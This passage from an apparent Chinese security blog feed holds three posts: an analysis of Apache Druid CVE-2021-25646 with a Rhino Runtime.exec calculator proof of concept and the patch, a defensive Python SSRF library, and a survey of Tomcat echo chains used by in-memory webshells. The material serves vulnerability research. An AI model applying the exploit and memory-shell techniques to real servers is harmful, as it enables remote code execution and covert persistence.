name为””，因此_propertyLookup生成了name为””,value为config赋值函数的一条记录</strong></p><p>步骤3中属性赋值中，根据key找对应set方法，具体实现函数为findCreatorProperty，就是从_propertyLookup寻找的，然后实现属性赋值</p><h3 id="Rhino"><a href="#Rhino" class="headerlink" title="Rhino"></a>Rhino</h3><p>javascript引擎，这里和前面比就简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Context cx = Context.enter();</span><br><span class="line">cx.setOptimizationLevel(<span class="number">9</span>);</span><br><span class="line">ScriptableObject scope = cx.initStandardObjects();</span><br><span class="line">String script = <span class="string">&quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)&#125;&quot;</span>;</span><br><span class="line">Function fnApply = cx.compileFunction(scope, script, <span class="string">&quot;script&quot;</span>, <span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line">fnApply.call(cx,scope,scope,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">Context.exit();</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>整个漏洞的精髓有两点</p><h3 id="1-利用Jackson-JsonCreator注解特性，覆盖JavaScriptDimFilter-JavaScriptConfig-config属性，开启javascript功能"><a href="#1-利用Jackson-JsonCreator注解特性，覆盖JavaScriptDimFilter-JavaScriptConfig-config属性，开启javascript功能" class="headerlink" title="1. 利用Jackson JsonCreator注解特性，覆盖JavaScriptDimFilter JavaScriptConfig config属性，开启javascript功能"></a>1. 利用Jackson JsonCreator注解特性，覆盖JavaScriptDimFilter JavaScriptConfig config属性，开启javascript功能</h3><p>覆盖config过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SamplerResource#SamplerResponse</span><br><span class="line">  IndexTaskSamplerSpec#IndexTaskSamplerSpec</span><br><span class="line">    IndexTask.IndexIngestionSpec#IndexIngestionSpec</span><br><span class="line">      DataSchema#DataSchema</span><br><span class="line">        TransformSpec#TransformSpec</span><br><span class="line">          JavaScriptDimFilter#JavaScriptDimFilter</span><br></pre></td></tr></table></figure><h3 id="2-JavaScriptDimFilter-toFilter-触发回溯"><a href="#2-JavaScriptDimFilter-toFilter-触发回溯" class="headerlink" title="2. JavaScriptDimFilter#toFilter 触发回溯"></a>2. JavaScriptDimFilter#toFilter 触发回溯</h3><p>作者给的poc是回溯到SamplerResource#post可用链，对应触发的调用栈如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">toFilter:149, JavaScriptDimFilter (org.apache.druid.query.filter)</span><br><span class="line">&lt;init&gt;:57, Transformer (org.apache.druid.segment.transform)</span><br><span class="line">toTransformer:126, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">decorate:117, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">buildReader:209, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:106, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:94, IndexTaskSamplerSpec (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">post:41, SamplerResource (org.apache.druid.indexing.overlord.sampler)</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复pr：<a href="https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0">https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0</a></p><p>其中最重要的修改在core/src/main/java/org/apache/druid/guice/GuiceAnnotationIntrospector.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> JsonIgnoreProperties.<span class="function">Value <span class="title">findPropertyIgnorals</span><span class="params">(Annotated ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// We should not allow empty names in any case. However, there is a known bug in Jackson deserializer</span></span><br><span class="line">  <span class="comment">// with ignorals (_arrayDelegateDeserializer is not copied when creating a contextual deserializer.</span></span><br><span class="line">  <span class="comment">// See https://github.com/FasterXML/jackson-databind/issues/3022 for more details), which makes array</span></span><br><span class="line">  <span class="comment">// deserialization failed even when the array is a valid field. To work around this bug, we return</span></span><br><span class="line">  <span class="comment">// an empty ignoral when the given Annotated is a parameter with JsonProperty that needs to be deserialized.</span></span><br><span class="line">  <span class="comment">// This is valid because every property with JsonProperty annoation should have a non-empty name.</span></span><br><span class="line">  <span class="comment">// We can simply remove the below check after the Jackson bug is fixed.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// This check should be fine for so-called delegate creators that have only one argument without</span></span><br><span class="line">  <span class="comment">// JsonProperty annotation, because this method is not even called for the argument of</span></span><br><span class="line">  <span class="comment">// delegate creators. I&#x27;m not 100% sure why it&#x27;s not called, but guess it&#x27;s because the argument</span></span><br><span class="line">  <span class="comment">// is some Java type that Jackson already knows how to deserialize. Since there is only one argument,</span></span><br><span class="line">  <span class="comment">// Jackson perhaps is able to just deserialize it without introspection.</span></span><br><span class="line">  <span class="keyword">if</span> (ac <span class="keyword">instanceof</span> AnnotatedParameter) &#123;</span><br><span class="line">    <span class="keyword">final</span> AnnotatedParameter ap = (AnnotatedParameter) ac;</span><br><span class="line">    <span class="keyword">if</span> (ap.hasAnnotation(JsonProperty.class)) &#123;</span><br><span class="line">      <span class="keyword">return</span> JsonIgnoreProperties.Value.empty();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> JsonIgnoreProperties.Value.forIgnoredProperties(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非JsonProperty会在_propertyLookup表中生成一条记录name为””空的映射，此处直接将非JsonProperty的属性忽略，也就不会有后续的JavaScriptConfig反序列化</p><h2 id="扩散思考"><a href="#扩散思考" class="headerlink" title="扩散思考"></a>扩散思考</h2><ol><li><p>Jackson name为空字符串的CreatorProperty变量覆盖，是个通用问题，如何自动化发现</p></li><li><p>发现可覆盖的变量，如何判断是否可利用，甚至RCE？</p></li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文从漏洞产生的思路，简要分析了CVE-2021-25646形成的成因，即Jackson JsonCreator的特性，和Druid 支持Rhino引擎，导致最终覆盖javascriptconfig默认参数，可以执行RCE。其实和参考中的几篇分析文章相比没什么其他新的东西。</p><p>从漏洞挖掘思路，猜测大佬事应该是先知道Jackson JsonCreator的这个特性的，然后盯着Rhino引擎搞事情，找出利用链。如果事先未知，从Rhino这点直接去啃Jackson，那就更加佩服了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">tomcat不出网回显连续剧第六集</a></li><li>[2] <a href="https://paper.seebug.org/1476/">漏洞复现: Apache Druid 远程代码执行漏洞 (CVE-2021-25646)</a></li><li>[3] <a href="https://paper.seebug.org/1481/">Apache Druid 远程代码执行漏洞分析(CVE-2021-25646)</a></li><li>[4] <a href="https://blog.csdn.net/zhaoruixiang1111/article/details/52972442">Guice之Servlet基础</a></li><li>[5] <a href="https://www.freebuf.com/vuls/263276.html">Apache Druid远程代码执行漏洞分析(CVE-2021-25646)</a></li><li>[6] <a href="https://blog.csdn.net/blwinner/article/details/98532847">Jackson之注解大全</a></li><li>[7] <a href="https://druid.apache.org/docs/latest/development/javascript.html">JavaScript programming guide</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Litch1大佬的这个洞有意思，终于有时间分析下，记录下分析过程&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/druid/&quot;&gt;https://archive.apache.org/dist/druid/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$wget&lt;/span&gt; https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;amp;&amp;amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据参考，修改conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config，末尾增加调试参数&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-Xdebug -Xnoagent -Djava.compiler&amp;#x3D;NONE -Xrunjdwp:transport&amp;#x3D;dt_socket,server&amp;#x3D;y,suspend&amp;#x3D;n,address&amp;#x3D;5005&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
  </entry>
  
  <entry>
    <title>pyAntiSSRF：python SSRF防御SDK</title>
    <link href="http://m0d9.me/2020/12/25/pyAntiSSRF/"/>
    <id>http://m0d9.me/2020/12/25/pyAntiSSRF/</id>
    <published>2020-12-25T02:34:00.000Z</published>
    <updated>2021-02-26T07:02:52.454Z</updated>
    
    <content type="html"><![CDATA[<p>发现居然没有特别好用的python防御ssrf好用的pip库，造个轮子</p><ul><li>支持pip简单安装</li><li>支持 py2&amp;py3</li><li>直接通过参数引用，直接hijack最常用的requests库，不引入第三方函数</li><li>支持防御DNS rebinding</li></ul><h2 id="SSRF原理及防御"><a href="#SSRF原理及防御" class="headerlink" title="SSRF原理及防御"></a>SSRF原理及防御</h2><p>ssrf攻击及防御这里不延伸，可参考【1】，p神讲的挺明白了，提两点</p><ol><li>原文没涉及到dns rebinding的防御，其实防御思路也很简单，只进行1次dns请求即可</li><li>循环hijack requests这个思路提到过，但是不是最优解，其实直接hijack requests.sessions.Session.request即可，所有的requests get/post最终都调用的这个函数</li></ol><p>具体没啥可说的，看代码【2】吧</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><code>pip install pyAntiSSRF</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. import &amp; patch requests库</span></span><br><span class="line"><span class="keyword">import</span> pyAntiSSRF</span><br><span class="line">pyAntiSSRF.patchRequests()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 通过参数anti_ssrf（get/post/request函数都支持，默认不开启），控制是否开启ssrf防御，如果开启且目标ip是内网，则会抛出异常</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># custom requests usage</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># patch requests by hijack requests.sessions.Session.request, default disable</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raise Exception</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">谈一谈如何在Python开发中拒绝SSRF漏洞</a></li><li>[2] <a href="https://github.com/yangbh/pyAntiSSRF">pyAntiSSRF</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;发现居然没有特别好用的python防御ssrf好用的pip库，造个轮子&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持pip简单安装&lt;/li&gt;
&lt;li&gt;支持 py2&amp;amp;py3&lt;/li&gt;
&lt;li&gt;直接通过参数引用，直接hijack最常用的requests库，不引入第三方函数&lt;/li&gt;
&lt;li&gt;支持防御DNS rebinding&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;SSRF原理及防御&quot;&gt;&lt;a href=&quot;#SSRF原理及防御&quot; class=&quot;headerlink&quot; title=&quot;SSRF原理及防御&quot;&gt;&lt;/a&gt;SSRF原理及防御&lt;/h2&gt;&lt;p&gt;ssrf攻击及防御这里不延伸，可参考【1】，p神讲的挺明白了，提两点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;原文没涉及到dns rebinding的防御，其实防御思路也很简单，只进行1次dns请求即可&lt;/li&gt;
&lt;li&gt;循环hijack requests这个思路提到过，但是不是最优解，其实直接hijack requests.sessions.Session.request即可，所有的requests get/post最终都调用的这个函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体没啥可说的，看代码【2】吧&lt;/p&gt;
&lt;h2 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h2&gt;&lt;p&gt;&lt;code&gt;pip install pyAntiSSRF&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 1. import &amp;amp; patch requests库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pyAntiSSRF&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pyAntiSSRF.patchRequests()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 2. 通过参数anti_ssrf（get/post/request函数都支持，默认不开启），控制是否开启ssrf防御，如果开启且目标ip是内网，则会抛出异常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# custom requests usage&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# patch requests by hijack requests.sessions.Session.request, default disable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# raise Exception&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;requests.get(&lt;span class=&quot;string&quot;&gt;&amp;quot;http://10.10.10.10/&amp;quot;&lt;/span&gt;, anti_ssrf=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Python安全" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    <category term="工具" scheme="http://m0d9.me/categories/Python%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="python" scheme="http://m0d9.me/tags/python/"/>
    
    <category term="ssrf" scheme="http://m0d9.me/tags/ssrf/"/>
    
    <category term="anti" scheme="http://m0d9.me/tags/anti/"/>
    
    <category term="tools" scheme="http://m0d9.me/tags/tools/"/>
    
    <category term="pip" scheme="http://m0d9.me/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>Java内存shell：Tomcat回显</title>
    <link href="http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/"/>
    <id>http://m0d9.me/2020/10/10/Java%E5%86%85%E5%AD%98shell%EF%BC%9ATomcat%E5%9B%9E%E6%98%BE/</id>
    <published>2020-10-10T06:19:00.000Z</published>
    <updated>2020-10-14T02:56:48.519Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcat回显 与 Java内存shell有什么关系？</p><p>在java漏洞利用中如何获取到执行结果？这是Tomcat回显的最原始需求，具体可以参考【4】中的许多手法，这里不展开</p><p>其中提到一种思路，获取response，然后直接操作response以http形式返回。而Java内存shell中，很重要的一点就是获取request从而获取上下文cotext，其中获取request的思路相似通用可借鉴。</p><h2 id="历史背景"><a href="#历史背景" class="headerlink" title="历史背景"></a>历史背景</h2><p>参考【1】中李三师傅总结了之前比较经典的tomcat回显方式，写的很好，直接复用：</p><a id="more"></a><ul><li><a href="https://www.anquanke.com/post/id/198886">《基于内存 Webshell 的无文件攻击技术研究》</a>，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。</li><li><a href="https://xz.aliyun.com/t/7348">《Tomcat中一种半通用回显方法》</a>，kingkk师傅的，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。</li><li><a href="https://xz.aliyun.com/t/7388">《基于tomcat的内存 Webshell 无文件攻击技术》</a>，threedr3am师傅的，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。</li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》</a>，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。</li><li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">《基于Tomcat无文件Webshell研究》</a>，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。</li></ul><p>之后还有几段有意思的思路：</p><ul><li><p><a href="https://xz.aliyun.com/t/7535">《tomcat不出网回显连续剧第六集》</a>，而李三师傅在以上的基础上，提出了与前文不同的获取RequestInfo思路，是一条通过registry&amp;Mbean全新的链，是目前见到最通用的方式了，适合tomcat7&amp;shiro。</p></li><li><p><a href="https://paper.seebug.org/1181/">《半自动化挖掘 request 实现多种中间件回显》</a> ,c0ny1师傅提出的，自动化遍历搜索全局request，一锤定音，算是Tomcat回显的终章了。</p></li></ul><p>以下来一一复现分析这些文章提到的姿势</p><h2 id="kingkk的ApplicationFilterChain利用链"><a href="#kingkk的ApplicationFilterChain利用链" class="headerlink" title="kingkk的ApplicationFilterChain利用链"></a>kingkk的ApplicationFilterChain利用链</h2><p>这个应该是kingkk师傅首次在参考【5】中提到的方法，参考【6】中使用的也是这个方法</p><h3 id="原理思路"><a href="#原理思路" class="headerlink" title="原理思路"></a>原理思路</h3><p>引用Litch1 的总结</p><blockquote><p>通过反射修改控制变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request,response存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response。</p></blockquote><p>发现的过程感觉很神奇:</p><p>ApplicationFilterChain有一个静态参数，lastServicedRequest，类型为ThreadLocal，在一定条件下会保留上一次访问的request</p><p><img src="/images/pasted-114.png" alt="upload successful"></p><p>攻击流程</p><ol><li><p>反射修改ApplicationDispatcher.WRAP_SAME_OBJECT 为true</p></li><li><p>internalDoFilter进入else流程，初始化lastServicedRequest和lastServicedResponse两个变量</p></li><li><p>从lastServicedRequest中获取当前请求request，从而获取到context<br> <img src="/images/pasted-116.png" alt="upload successful"></p></li></ol><p>其中使用Java反射更改私有静态final字段，原理详见<a href="https://cloud.tencent.com/developer/ask/195780">https://cloud.tencent.com/developer/ask/195780</a></p><h2 id="Litch1的Thread-amp-StandardService-利用链"><a href="#Litch1的Thread-amp-StandardService-利用链" class="headerlink" title="Litch1的Thread&amp;StandardService 利用链"></a>Litch1的Thread&amp;StandardService 利用链</h2><p>其实目的都是为了寻找存储了request的对象，Litch1在此基础上手动追溯了Tomcat全局存储中的request。</p><h3 id="原理思路-1"><a href="#原理思路-1" class="headerlink" title="原理思路"></a>原理思路</h3><p>跟踪的过程比较复杂，而且需要对Tomcat启动流程要有一定了解，详情还是参考【8】（照着追了下，知其然不知其所以然，对Tomcat还是不够了解）</p><p>最后的利用路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase -&gt;</span><br><span class="line">ApplicationContext(getResources().getContext()) -&gt; </span><br><span class="line">StandardService -&gt;</span><br><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectoinHandler -&gt;</span><br><span class="line">                global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="李三师傅的MBean-amp-Registry的利用链"><a href="#李三师傅的MBean-amp-Registry的利用链" class="headerlink" title="李三师傅的MBean&amp;Registry的利用链"></a>李三师傅的MBean&amp;Registry的利用链</h2><h3 id="原理思路-2"><a href="#原理思路-2" class="headerlink" title="原理思路"></a>原理思路</h3><p>参考【2】</p><p>上节中，是通过Connector入手拿到ProtocolHandler。其实再仔细看一下Connector类的依赖树就可以发现其实所有的参数并非是单独存放在这些类中的一个属性中的，而是都被注册到了MBeanServer中的：</p><p>最后的利用路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(null, null).getMBeanServer() -&gt;</span><br><span class="line">JmxMBeanServer.mbsInterceptor -&gt;</span><br><span class="line">DefaultMBeanServerInterceptor.repository -&gt;</span><br><span class="line">Registory#query -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response</span><br></pre></td></tr></table></figure><h2 id="c0ny1的半自动化挖掘思路"><a href="#c0ny1的半自动化挖掘思路" class="headerlink" title="c0ny1的半自动化挖掘思路"></a>c0ny1的半自动化挖掘思路</h2><p>这个当属大牛级思路了，人工分析调用链可能有疏漏，直接内存搜索相关的对象，简单直接，可以说是终结了全局搜索request思路（当然kingkk的改变了tomcat处理流程的链是找不到的），膜拜。</p><p>具体参考【7】，代码思路原文都挺详细，就不班门弄斧了</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文只能算是对于以上师傅们挖Tomcat回显文章的学习总结，一篇篇文章读来，感觉有师傅们在华山论剑的味道。姿势固然奇妙，更奇妙的是师傅们找各种猥琐姿势的思路，获益匪浅。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/7535">tomcat不出网回显连续剧第六集</a></li><li>[2] <a href="https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">Tomcat通用回显学习</a></li><li>[3] <a href="https://www.cnblogs.com/potatsoSec/p/13060261.html">tomcat结合shiro无文件webshell的技术研究以及检测方法</a></li><li>[4] <a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/">Java Web代码执行漏洞回显总结</a></li><li>[5] <a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a></li><li>[6] <a href="https://xz.aliyun.com/t/7388#toc-1">基于tomcat的内存 Webshell 无文件攻击技术</a></li><li>[7] <a href="https://paper.seebug.org/1181/">半自动化挖掘 request 实现多种中间件回显</a></li><li>[8] <a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Tomcat回显 与 Java内存shell有什么关系？&lt;/p&gt;
&lt;p&gt;在java漏洞利用中如何获取到执行结果？这是Tomcat回显的最原始需求，具体可以参考【4】中的许多手法，这里不展开&lt;/p&gt;
&lt;p&gt;其中提到一种思路，获取response，然后直接操作response以http形式返回。而Java内存shell中，很重要的一点就是获取request从而获取上下文cotext，其中获取request的思路相似通用可借鉴。&lt;/p&gt;
